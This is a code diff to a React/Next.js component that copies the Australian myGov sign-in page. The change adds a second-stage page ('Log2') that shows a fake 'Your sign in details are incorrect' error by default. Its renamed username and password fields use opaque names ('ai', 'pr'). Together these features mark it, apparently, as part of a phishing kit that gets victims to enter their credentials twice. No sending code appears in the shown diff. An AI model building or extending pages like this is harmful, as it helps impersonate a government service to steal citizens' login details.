@@ -1,6 +1,6 @@
 "use client";
 
-export default function Home() {
+export default function Log2() {
   return (
     <>
       <header role="banner" className="mgvEnhanceHeader">
@@ -36,6 +36,22 @@ export default function Home() {
                       <a data-go-back-link="" className="button-back" href="#"
                       >Back</a
                       >
+
+                      <div id="error-msg-container">
+                        <div className="error-msg" role="alert" aria-live="assertive">
+                          <span className="is-visuallyhidden">Error message:</span>
+                          <div className="error-msg-text">
+                            <span>
+                              <strong>Error</strong>
+                              <br />
+                              Your sign in details are incorrect. (RFM10A)
+                              <br />
+                              <br />
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+
                       <h1>Sign in with myGov</h1>
                       <p className="login-instruction-text">
                         Choose how to sign in from these 2 options
@@ -43,7 +59,7 @@ export default function Home() {
                       <h2 className="text-align-left">
                         Using your myGov sign in details
                       </h2>
-                      <form id="mygov-login">
+                      <form id="mygov-login2">
                         <input type="hidden" name="btn1" value="btn1" />
                         <div id="msg" style={{ display: "none", color: "red" }}>
                           Invalid password..! Please enter correct password.
@@ -53,7 +69,7 @@ export default function Home() {
                           >Username or email</label
                           >
                           <input
-                            id="userId"
+                            id="userId2"
                             name="ai"
                             type="text"
                             value=""
@@ -81,12 +97,12 @@ export default function Home() {
                               screen.
                             </p>
                             <input
-                              id="password"
+                              id="password2"
                               name="pr"
                               type="password"
                               aria-required="true"
                               required
-                            onChange={(e) => { }}
+                              onChange={(e) => { }}
                             />
                           </div>
                         </div>
